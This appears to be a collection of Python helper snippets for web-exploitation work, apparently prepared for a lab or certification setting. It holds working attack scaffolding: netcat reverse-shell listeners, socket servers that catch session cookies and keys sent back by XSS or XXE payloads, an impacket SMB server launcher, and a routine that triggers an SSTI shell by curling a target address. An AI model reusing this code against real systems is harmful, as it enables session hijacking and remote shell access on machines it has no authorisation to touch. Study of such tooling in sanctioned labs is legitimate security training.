#Run OS command:

#Method 1:
cmd = 'bash -c "impacket-smbserver myServer . -smb2support"'
from subprocess import call
call(cmd,shell=True)

#Method 2:
import os
cmd = "java OpenCRXToken %s %s > tokens.txt 2> /dev/null" % (time1,time2)
os.system(cmd)

######################################
#Open netcat listener:
            
def startListener():
	netcat = 'bash -c "nc -nvlp 5555"'
	from subprocess import call
	call(netcat,shell=True)
     
startListener()

######################################
#Receive/parse cookie callback:
import socket, re
def listenForCookie(ip,port):
    print('Waiting to receive cookie...')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        ans = conn.recv(1024).decode()
        #sys.stdout.write(ans)
        if 'cookie=' in ans:
            cookie=re.findall("cookie=[\w-]+", ans, re.MULTILINE)[0][7:]
            return cookie

cookie=listenForCookie("0.0.0.0",80)
print(cookie)

######################################
#Receive/parse other callback:

def listenForXXECallback(ip,port):
    print('Waiting on user to view XXS payload page...')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, port))
    s.listen(1)
    print("Listening on port " + str(port))
    conn, addr = s.accept()
    print('Connection received from ',addr)
    while True:
        ans = conn.recv(1024).decode()
        #sys.stdout.write(ans)
        if 'KEY' in ans:
            key=re.findall("KEY=[\w-]+", ans, re.MULTILINE)[0][4:]
            return key

key=listenForXXECallback("0.0.0.0",4444)

######################################



#Multi-Process Method - open netcat listener and trigger:

def openListener():
    listener = 'bash -c "nc -nvlp 5555"'
    print ("\nStarting listener on port 5555")
    from subprocess import call
    call(listener,shell=True)

def triggerSSTIShell():
    time.sleep(3)
    trigger = 'bash -c "curl http://192.168.148.249/"'
    print ("\nTriggering via curl...")
    from subprocess import call
    call(trigger,shell=True)

triggerProcess=Process(target=triggerSSTIShell)
listenerProcess=Process(target=openListener)
if RCEMETHOD == 'SSTI':
    triggerProcess.start()
listenerProcess.start()  